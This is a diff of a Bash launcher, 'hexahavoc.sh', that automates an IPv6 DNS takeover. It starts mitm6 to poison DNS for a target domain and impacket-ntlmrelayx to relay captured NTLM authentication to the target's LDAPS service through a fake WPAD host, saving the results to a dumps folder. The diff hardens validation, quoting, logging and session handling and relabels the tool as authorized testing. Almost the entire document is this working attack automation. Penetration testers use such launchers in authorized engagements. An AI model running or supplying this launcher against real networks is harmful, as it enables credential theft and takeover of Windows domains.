@@ -1,234 +1,226 @@
 #!/bin/bash
 set -euo pipefail
 IFS=$'\n\t'
-# ===============================================================
-# hexahavoc.sh - IPv6 DNS Takeover Automation Script
-# ---------------------------------------------------------------
-# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
-# ===============================================================
 
-# Define color variables
-RED="\033[31m"
-BLUE="\033[34m"
-GREEN="\033[32m"
-YELLOW="\033[33m"
-CYAN="\033[36m"
-RESET="\033[0m"
-
-# Initialize variables with default values
+# hexahavoc.sh - authorized IPv6 DNS security testing launcher (Linux).
 target_domain=""
 target_ip=""
 interface="eth0"
-verbose=0
 loot_dir="dumps"
+verbose=0
+silent=0
 session_name=""
+created_session=0
+keep_session=0
+duration=""
+deadline=0
+session_target=""
 
-
-# Print usage information
 usage() {
-  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-l <loot_dir>] [-v]${RESET}"
-  echo -e "${YELLOW}Options:${RESET}"
-  echo -e "  -d  Specify the target domain"
-  echo -e "  -t  Specify the target IP"
-  echo -e "  -i  Specify the network interface (default: eth0)"
-  echo -e "  -l  Specify loot output directory (default: dumps)"
-  echo -e "  -v  Enable verbose logging"
-  exit 1
+  cat <<'HELP'
+Usage: hexahavoc.sh -d <domain> -t <IP> [-i <interface>] [-l <directory>] [--duration <seconds>] [-v | -s]
+  -d  Target domain (required)
+  -t  Literal IPv4 or IPv6 address (required)
+  -i  Network interface (default: eth0)
+  -l  Parent directory for timestamped run folders (default: dumps)
+  --duration  Stop the new session after this many seconds (positive integer)
+  -v  Trace launcher commands (may expose arguments in terminal output)
+  -s  Suppress launcher status messages; tool output and errors remain visible
+  -h  Show help
+HELP
 }
 
-# Banner function
-banner() {
-  echo -e "${RED}"
-  echo -e "                                                                       "
-  echo -e " .__                             .__                                   "
-  echo -e " |  |__    ____  ___  ________   |  |__  _____  ___  __ ____    ____   "
-  echo -e " |  |  \ _/ __ \ \  \/  /\__  \  |  |  \ \__  \ \  \/ //  _ \ _/ ___\  "
-  echo -e " |   Y  \\  ___/  >    <  / __ \_|   Y  \ / __ \_\   /(  <_> )\  \___  "
-  echo -e " |___|  / \___  >/__/\_ \(____  /|___|  /(____  / \_/  \____/  \___  > "
-  echo -e "      \/      \/       \/     \/      \/      \/                   \/  "
-  echo -e "${YELLOW}                                by sp3ttro                             "
-  echo -e "                                                                       "
-  echo -e "                                                                       "
-  echo -e "${RESET}"
-}                                                      
+fail() { printf 'Error: %s\n' "$*" >&2; exit 1; }
+log() { if (( silent == 0 )); then printf '%s\n' "$*"; fi; }
 
+cleanup() {
+  local status=$?
+  trap - EXIT
+  if (( created_session == 1 && keep_session == 0 )); then
+    if tmux has-session -t "$session_target" 2>/dev/null &&
+       ! tmux kill-session -t "$session_target" 2>/dev/null; then
+      printf 'Warning: could not clean up session %s; check tmux manually.\n' "$session_name" >&2
+    fi
+  fi
+  exit "$status"
+}
+trap cleanup EXIT
+trap 'exit 130' INT
+trap 'exit 143' TERM
+trap 'exit 129' HUP
 
-# Parse command-line arguments
-while getopts ":d:t:i:l:v" opt; do
+while getopts ':d:t:i:l:vsh-:' opt; do
   case "$opt" in
-    d) target_domain="$OPTARG" ;;
-    t) target_ip="$OPTARG" ;;
-    i) interface="$OPTARG" ;;
-    l) loot_dir="$OPTARG" ;;
+    d) target_domain=$OPTARG ;;
+    t) target_ip=$OPTARG ;;
+    i) interface=$OPTARG ;;
+    l) loot_dir=$OPTARG ;;
     v) verbose=1 ;;
-    \?) usage ;;
+    s) silent=1 ;;
+    h) usage; exit 0 ;;
+    -)
+      case "$OPTARG" in
+        duration)
+          (( OPTIND <= $# )) || fail '--duration requires a value.'
+          duration=${!OPTIND}
+          OPTIND=$((OPTIND + 1))
+          ;;
+        duration=*) duration=${OPTARG#duration=} ;;
+        *) fail "Unknown option: --$OPTARG. Use -h for help." ;;
+      esac
+      [[ "$duration" =~ ^[1-9][0-9]*$ && ${#duration} -le 10 ]] || fail '--duration must be a positive integer (seconds).'
+      (( duration <= 2147483647 )) || fail '--duration must not exceed 2147483647 seconds.'
+      ;;
+    :) fail "Option -$OPTARG requires a value." ;;
+    \?) fail "Unknown option: -$OPTARG. Use -h for help." ;;
   esac
 done
+shift "$((OPTIND - 1))"
+(( $# == 0 )) || fail 'Unexpected positional arguments. Use -h for help.'
+(( verbose == 0 || silent == 0 )) || fail '-v and -s cannot be combined.'
+[[ -n "$target_domain" && -n "$target_ip" ]] || fail 'Both -d and -t are required.'
+[[ -n "$interface" && -n "$loot_dir" ]] || fail 'Interface and output directory cannot be empty.'
 
+# Reject malformed DNS labels, including leading/trailing hyphens.
+[[ ${#target_domain} -le 253 && "$target_domain" == *.* ]] || fail 'Invalid domain format.'
+[[ "$target_domain" != *. ]] || fail 'Use a domain without a trailing dot.'
+IFS='.' read -r -a labels <<< "$target_domain"
+for label in "${labels[@]}"; do
+  [[ ${#label} -le 63 && "$label" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?$ ]] || fail 'Invalid domain label.'
+done
 
+[[ "$(uname -s)" == Linux ]] || fail 'This launcher requires Linux (macOS is not supported).'
+for cmd in tmux mitm6 impacket-ntlmrelayx ip python3 mkdir sleep date mktemp tee; do
+  command -v "$cmd" >/dev/null 2>&1 || fail "Required command not found: $cmd"
+done
+(( EUID == 0 )) || fail 'Run this script as root.'
 
-# Check if a command exists
-check_command() {
-  command -v "$1" >/dev/null || {
-    echo -e "${RED}'$1' not found${RESET}"
-    exit 1
-  }
+# Parse a literal address without DNS queries or an ICMP reachability gate.
+ip_version=$(python3 - "$target_ip" <<'PYIP'
+import ipaddress
+import sys
+try:
+    if '%' in sys.argv[1]:
+        raise ValueError('Scoped IPv6 addresses are not supported')
+    print(ipaddress.ip_address(sys.argv[1]).version)
+except ValueError:
+    sys.exit(1)
+PYIP
+) || fail 'Target must be a literal IPv4 or IPv6 address (without a zone ID).'
+ip link show dev "$interface" >/dev/null 2>&1 || fail "Interface not found: $interface"
+
+if (( verbose == 1 )); then set -x; fi
+safe_domain="${target_domain//[^a-zA-Z0-9]/_}"
+session_name="ipv6_dns_takeover_${safe_domain}"
+session_target="=$session_name"
+
+# Do not claim ownership of an existing session or kill it on an unrelated error.
+if tmux has-session -t "=$session_name" 2>/dev/null; then
+  [[ -z "$duration" ]] || fail '--duration applies only to a new session; stop the existing session first.'
+  [[ -t 0 && -t 1 ]] || fail "Session $session_name already exists; manage it with tmux."
+  printf 'Session %s exists. Attach [a] or kill and exit [k]: ' "$session_name"
+  read -r user_choice || fail 'No session choice received.'
+  case "$user_choice" in
+    a|A) tmux attach-session -t "=$session_name"; exit $? ;;
+    k|K) tmux kill-session -t "=$session_name"; exit $? ;;
+    *) fail 'Expected a or k.' ;;
+  esac
+fi
+[[ -t 0 && -t 1 ]] || fail 'An interactive terminal is required to attach to tmux.'
+[[ -z "${TMUX:-}" ]] || fail 'Run this launcher outside tmux to avoid a nested attachment.'
+
+# Restrict newly created output files and use a stable absolute directory.
+umask 077
+mkdir -p -- "$loot_dir"
+loot_dir=$(cd -- "$loot_dir" && pwd -P)
+[[ -w "$loot_dir" ]] || fail "Output directory is not writable: $loot_dir"
+# Each run gets its own directory, even when two runs start in the same second.
+execution_stamp=$(date '+%Y-%m-%d_%H-%M-%S')
+run_dir=$(mktemp -d "$loot_dir/${execution_stamp}_XXXXXX")
+mitm_log="$run_dir/mitm6.log"
+relay_log="$run_dir/ntlmrelayx.log"
+: > "$mitm_log"
+: > "$relay_log"
+log "Saving this run's output to: $run_dir"
+relay_target="ldaps://$target_ip"
+if [[ "$ip_version" == 6 ]]; then relay_target="ldaps://[$target_ip]"; fi
+
+# Quote each argument for the tmux shell. Never interpolate raw inputs as code.
+shell_command() {
+  local arg
+  printf 'exec'
+  for arg in "$@"; do
+    arg=${arg//\'/\'\\\'\'}
+    printf " '%s'" "$arg"
+  done
 }
 
-[[ "$verbose" -eq 1 ]] && set -x
+# Capture stdout and stderr from the first byte, while displaying both in tmux.
+# Positional arguments keep paths and tool arguments out of the shell program.
+logged_command() {
+  shell_command /bin/bash -o pipefail -c '
+    umask 077
+    export PYTHONUNBUFFERED=1
+    log_file=$1
+    shift
+    "$@" 2>&1 | tee -a -- "$log_file"
+  ' hexahavoc-log "$@"
+}
 
-# Ensure required arguments are provided
-if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
-  echo -e "${RED}Error: Both -d (target_domain) and -t (target_ip) arguments are required.${RESET}"
-  usage
+log "Creating session $session_name..."
+# The logging wrapper exits with its pipeline; no interactive shell stays open.
+mitm_command=$(logged_command "$mitm_log" mitm6 -i "$interface" -d "$target_domain")
+mitm_pane=$(tmux new-session -d -P -F '#{pane_id}' -s "$session_name" -n mitm6 "$mitm_command")
+created_session=1
+# Use the immutable session ID so a later same-name session is never targeted.
+owned_session_id=$(tmux display-message -p -t "$mitm_pane" '#{session_id}')
+session_target=$owned_session_id
+if [[ -n "$duration" ]]; then
+  deadline=$((SECONDS + duration))
+  # A session-owned timer survives client detach and is closed with the session.
+  # No login shell or interactive prompt remains after the timer command exits.
+  timer_command=$(shell_command /bin/bash -c 'sleep "$1" && exec tmux kill-session -t "$2"' hexahavoc-timer "$duration" "$session_target")
+  tmux new-window -d -t "$session_target" -n duration "$timer_command"
+  log "This session will close automatically after $duration seconds, even if detached."
 fi
 
-# Validate target domain
-if ! [[ "$target_domain" =~ ^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$ ]]; then
-  echo -e "${RED}Error: Invalid domain format.${RESET}"
-  exit 1
-fi
-
-# Validate target IP (basic check for IPv4/IPv6)
-validate_ip() {
-  if ! getent hosts "$1" >/dev/null 2>&1; then
-    echo -e "${RED}Invalid or unresolvable IP${RESET}"
-    exit 1
+finish_if_expired() {
+  if [[ -n "$duration" ]] && (( SECONDS >= deadline )) &&
+     ! tmux has-session -t "$session_target" 2>/dev/null; then
+    log "Duration of $duration seconds reached; session closed."
+    keep_session=1
+    exit 0
   fi
 }
 
-validate_ip "$target_ip"
-
-ping -c1 -W2 "$target_ip" &>/dev/null || {
-  echo -e "${RED}Target not reachable${RESET}"
-  exit 1
+relay_command=$(logged_command "$relay_log" impacket-ntlmrelayx -6 -t "$relay_target" -wh "fakewpad.$target_domain" -l "$run_dir")
+relay_pane=$(tmux new-window -d -P -F '#{pane_id}' -t "$session_target" -n impacket-ntlmrelayx "$relay_command") || {
+  finish_if_expired
+  fail 'Could not create the ntlmrelayx window.'
 }
 
-ip -o link show | grep -qw "$interface" || {
-  echo -e "${RED}Invalid interface: $interface${RESET}"
-  exit 1
-}
-
-# Check dependencies
-echo -e "${CYAN}Checking dependencies...${RESET}"
-for cmd in tmux mitm6 impacket-ntlmrelayx; do
-  check_command "$cmd"
-done
-
-# Root privilege check
-if [ "$EUID" -ne 0 ]; then
-  echo -e "${RED}Error: This script must be run as root.${RESET}"
-  exit 1
-fi
-
-safe_domain="${target_domain//[^a-zA-Z0-9]/_}"
-session_name="ipv6_dns_takeover_${safe_domain}"
-
-# Create loot directory if it doesn't exist
-if [[ ! -d "$loot_dir" ]]; then
-  mkdir -p "$loot_dir"
-else
-  echo -e "${YELLOW}Warning: Loot directory '$loot_dir' already exists. Results may be overwritten.${RESET}"
-fi
-
-# Show the banner
-banner
-
-# Check if tmux session exists
-if tmux has-session -t "$session_name" 2>/dev/null; then
-  echo -e "${YELLOW}[!] Tmux session '${session_name}' already exists.${RESET}"
-
-  echo -e "${BLUE}Do you want to:${RESET}"
-  echo -e "  [a] Attach to existing session"
-  echo -e "  [k] Kill existing session"
-  read -rp "$(echo -e "${YELLOW}Choose [a/k]: ${RESET}")" user_choice
-
-  case "$user_choice" in
-    [aA])
-      echo -e "${GREEN}[*] Attaching to existing tmux session...${RESET}"
-      tmux attach-session -t "$session_name"
-      exit 0
-      ;;
-    [kK])
-      echo -e "${RED}[*] Killing existing tmux session...${RESET}"
-      tmux kill-session -t "$session_name"
-      echo -e "${GREEN}[*] Session killed. Exiting.${RESET}"
-      exit 0
-      ;;
-    *)
-      echo -e "${RED}[!] Invalid choice. Exiting.${RESET}"
-      exit 1
-      ;;
-  esac
-fi
-
-# Create a new tmux session
-echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
-tmux new-session -d -s "$session_name" || {
-  echo -e "${RED}Failed to create tmux session${RESET}"
-  exit 1
-}
-
-# Function to start a tmux window
-start_tmux_window() {
-  local session_name="$1"
-  local window_name="$2"
-  local command="$3"
-  tmux new-window -dt "$session_name" -n "$window_name" || {
-    echo "Failed to create window"
-    exit 1
+check_pane() {
+  local state
+  state=$(tmux display-message -p -t "$1" '#{pane_dead}') || {
+    finish_if_expired
+    fail "$2 exited during startup."
   }
-  tmux send-keys \
-    -t "$session_name:$window_name" \
-    "bash -lc $(printf '%q' "$command")" C-m
+  if [[ "$state" != 0 ]]; then
+    finish_if_expired
+    fail "$2 exited during startup."
+  fi
 }
-
-# Start mitm6 in tmux session
-echo -e "${CYAN}Starting mitm6 on interface $interface for domain $target_domain...${RESET}"
-start_tmux_window "$session_name" "mitm6" "mitm6 -i \"$interface\" -d \"$target_domain\"" || {
-  echo -e "${RED}Failed to start mitm6.${RESET}"
-  exit 1
-}
-
-# Start impacket-ntlmrelayx in tmux session
-echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
-start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $loot_dir" || {
-  echo -e "${RED}Failed to start impacket-ntlmrelayx.${RESET}"
-  exit 1
-}
-
-sleep 2
-
-if ! tmux list-panes -t "$session_name:mitm6" >/dev/null 2>&1; then
-    echo -e "${RED}mitm6 failed immediately. Check its tmux window.${RESET}"
-    exit 1
-fi
-
-if ! tmux list-panes -t "$session_name:impacket-ntlmrelayx" >/dev/null 2>&1; then
-    echo -e "${RED}ntlmrelayx failed immediately. Check its tmux window.${RESET}"
-    exit 1
-fi
-
-
-for _ in {1..10}; do
-    if pgrep -fa "mitm6.*$target_domain" >/dev/null &&
-       pgrep -fa "ntlmrelayx.*$target_ip" | grep -vq "bash -lc"; then
-        break
-    fi
-    sleep 1
+# These are session-owned process liveness checks, not service readiness checks.
+for _ in 1 2 3; do
+  sleep 1
+  check_pane "$mitm_pane" mitm6
+  check_pane "$relay_pane" impacket-ntlmrelayx
 done
-
-pgrep -fa "mitm6.*$target_domain" >/dev/null &&
-pgrep -fa "ntlmrelayx.*$target_ip" | grep -vq "bash -lc" || {
-    echo -e "${RED}One or more tools failed to start.${RESET}"
-    exit 1
+log 'Both processes survived the startup check; inspect their output for readiness.'
+log "Attaching to $session_name. Detaching leaves the tools running."
+tmux attach-session -t "$session_target" || {
+  finish_if_expired
+  fail 'Could not attach to the session.'
 }
-
-# Attach to the tmux session
-echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
-tmux attach-session -t "$session_name" || {
-  echo -e "${RED}Failed to attach to session${RESET}"
-  exit 1
-}
-
-exit 0
+# Successful detach deliberately preserves the session. Failures clean it up.
+keep_session=1
